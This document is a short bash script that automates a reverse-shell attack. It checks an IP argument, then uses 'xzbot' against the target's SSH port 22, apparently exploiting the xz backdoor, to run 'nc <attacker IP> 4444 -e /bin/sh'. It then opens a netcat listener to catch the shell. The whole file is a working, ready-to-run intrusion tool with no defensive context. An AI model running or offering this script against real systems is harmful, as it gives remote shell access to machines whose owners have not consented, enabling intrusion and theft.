#!/bin/bash

argument_count="${#}"
target_address="${1}"
ip_pattern="^([0-9]{1,3}\.){3}[0-9]{1,3}$"

# Check argument
if [[ ${argument_count} -eq 0 ]]; then
	echo "[-] IP address not given"
	exit 1
elif [[ ${argument_count} -gt 1 ]]; then
	echo "[-] Too many arguments"
	exit 1
elif [[ ! ${target_address} =~ ${ip_pattern} ]]; then
	echo "[-] Invalid IP address"
	exit 1
fi

echo "[+] Starting reverse shell automation"

# Send nc command to establish reverse shell
echo "[+] Send request to localhost from ${target_address} after 1 second"
sleep 1 && xzbot -addr ${target_address}:22 -cmd "nc $(curl -s ifconfig.me) 4444 -e /bin/sh" > /dev/null 2>&1 &

# Set localhost as a listener
echo "[+] Set localhost as a listener"
nc -lvp 4444

wait